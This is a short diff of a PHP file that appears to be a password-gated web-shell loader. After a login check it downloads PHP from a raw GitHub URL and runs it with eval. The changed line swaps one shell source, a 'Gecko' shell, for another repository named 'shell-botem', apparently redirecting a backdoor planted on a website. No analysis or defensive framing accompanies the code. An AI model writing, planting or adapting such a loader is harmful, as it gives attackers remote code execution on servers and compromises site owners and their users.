@@ -62,7 +62,7 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/botem445/shell-botem/refs/heads/main/404.php');
     eval('?>' . $a);
 }
 ?>
